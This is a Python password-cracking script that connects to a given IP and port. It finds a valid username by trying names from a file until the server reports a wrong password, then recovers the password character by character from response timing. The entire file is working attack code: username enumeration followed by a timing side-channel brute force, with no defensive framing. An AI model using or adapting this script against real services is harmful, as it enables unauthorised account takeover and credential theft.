import socket
import argparse
import string
import json
import time


argparser = argparse.ArgumentParser(description="This is a program to crack the passwords of a website")
argparser.add_argument("ip", help="Enter the IP Address")
argparser.add_argument("port", help="Enter the port number")
args = argparser.parse_args()
socker = socket.socket()
address = args.ip, int(args.port)
socker.connect(address)
with open("logins.txt", "r") as logins_file:
    logins = map(lambda x: x.strip(), logins_file.readlines())
password = ""
for login in logins:
    message = {"login": login, "password": password}
    message = json.dumps(message)
    socker.send(message.encode())
    response = socker.recv(1024)
    response = response.decode()
    response = json.loads(response)
    if response["result"] == "Wrong password!":
        admin = login
        break
pool = string.ascii_letters + string.digits
cracked = False
while not cracked:
    for letter in pool:
        message = {"login": admin, "password": password + letter}
        message = json.dumps(message, indent=4)
        start = time.time()
        socker.send(message.encode())
        response = socker.recv(1024)
        end = time.time()
        response = response.decode()
        response = json.loads(response)
        if response["result"] == "Connection success!":
            print(message)
            cracked = True
            break
        elif end - start > 0.1:
            password += letter
            break
socker.close()
